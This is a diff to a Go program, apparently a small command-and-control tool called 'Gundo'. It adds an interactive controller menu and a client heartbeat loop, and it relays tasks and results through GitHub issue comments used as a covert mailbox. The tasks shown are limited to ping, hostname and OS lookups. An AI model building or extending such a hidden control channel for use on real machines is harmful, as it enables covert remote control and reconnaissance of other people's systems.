@@ -82,8 +82,10 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"os"
+	"strings"
 	"time"
 	"uuid"
 )
@@ -139,17 +141,24 @@ func runClient() {
 
 	client := newClient(state.ClientID)
 
+	// seperate go routine to run the heartbeast concurrent with poll tasks
+	go client.heartbeatLoop(state.IssueNumber)
+
 	client.pollTasks(state.IssueNumber)
 }
 
+// polling comments to poll comments and grab results
+// CLI version of pollComments()
 func waitForResult(issueNumber int, taskID string) (GundoMessage, error) {
 	for {
+		// grab comments
 		comments, err := listComments(issueNumber)
 		if err != nil {
 			return GundoMessage{}, err
 		}
 
 		for _, comment := range comments {
+			// parses comment into Gundo Struct to read and work with
 			message, err := parseGundoMessage(comment.Body)
 			if err != nil {
 				continue
@@ -173,31 +182,108 @@ func waitForResult(issueNumber int, taskID string) (GundoMessage, error) {
 	}
 }
 
-func runController(clientID string) {
-	const issueNumber = 30
-
-	fmt.Println("=== Gundo Controller ===")
-
-	task := createTaskMessage("ping")
-	task.TargetClientID = clientID
-
-	fmt.Printf("[+] Task created: %s\n", task.TaskID)
-	fmt.Printf("[+] Target client: %s\n", task.TargetClientID)
-
-	err := createComment(issueNumber, task)
+func runController() {
+	// check for current state
+	// heartbeats to be added to test things out on its own
+	state, err := loadState()
 	if err != nil {
-		fmt.Printf("Error sending task: %v\n", err)
+		fmt.Printf("Failed to load client state: %v\n", err)
 		return
 	}
 
-	fmt.Println("[+] Task posted successfully")
+	// picks up from current state
+	fmt.Println("=== Gundo Controller ===")
+	fmt.Printf("[+] Client ID: %s\n", state.ClientID)
+	fmt.Printf("[+] Mailbox: Issue #%d\n", state.IssueNumber)
+
+	reader := bufio.NewReader(os.Stdin)
+
+	for {
+		fmt.Println("\n=== Commands ===")
+		fmt.Println("1. Ping")
+		fmt.Println("2. Get Hostname")
+		fmt.Println("3. Get OS")
+		fmt.Println("0. Exit")
+
+		fmt.Print("\nSelect command: ")
+
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Printf("Error reading command: %v\n", err)
+			continue
+		}
+
+		choice := strings.TrimSpace(input)
+
+		var action string
+
+		switch choice {
+		case "1":
+			action = "ping"
+
+		case "2":
+			action = "get_hostname"
+
+		case "3":
+			action = "get_os"
+
+		case "0":
+			fmt.Println("Exiting controller.")
+			return
+
+		default:
+			fmt.Println("Invalid command.")
+			continue
+		}
+
+		// Create a new Gundo task based on the action
+		task := createTaskMessage(action)
+
+		// Target the client loaded from state.json.
+		task.TargetClientID = state.ClientID
+
+		fmt.Printf(
+			"\n[+] Sending %s task\n",
+			action,
+		)
+
+		fmt.Printf(
+			"[+] Task ID: %s\n",
+			task.TaskID,
+		)
+
+		// Send the task to this client's mailbox.
+		err = createComment(state.IssueNumber, task)
+		if err != nil {
+			fmt.Printf("Error sending task: %v\n", err)
+			continue
+		}
+
+		fmt.Println("[+] Task posted")
+		fmt.Println("[+] Waiting for result...")
+
+		// Wait specifically for this task's response.
+		result, err := waitForResult(
+			state.IssueNumber,
+			task.TaskID,
+		)
+
+		if err != nil {
+			fmt.Printf("Error waiting for result: %v\n", err)
+			continue
+		}
+
+		fmt.Println("\n=== Result ===")
+		fmt.Printf("Status: %s\n", result.Status)
+		fmt.Printf("Output: %s\n", result.Output)
+	}
 }
 
 func main() {
 	if len(os.Args) < 2 {
 		fmt.Println("Usage:")
 		fmt.Println("  go run . client")
-		fmt.Println("  go run . controller <client-id>")
+		fmt.Println("  go run . controller")
 		return
 	}
 
@@ -206,12 +292,7 @@ func main() {
 		runClient()
 
 	case "controller":
-		if len(os.Args) < 3 {
-			fmt.Println("Usage: go run . controller <client-id>")
-			return
-		}
-
-		runController(os.Args[2])
+		runController()
 
 	default:
 		fmt.Println("Unknown mode:", os.Args[1])
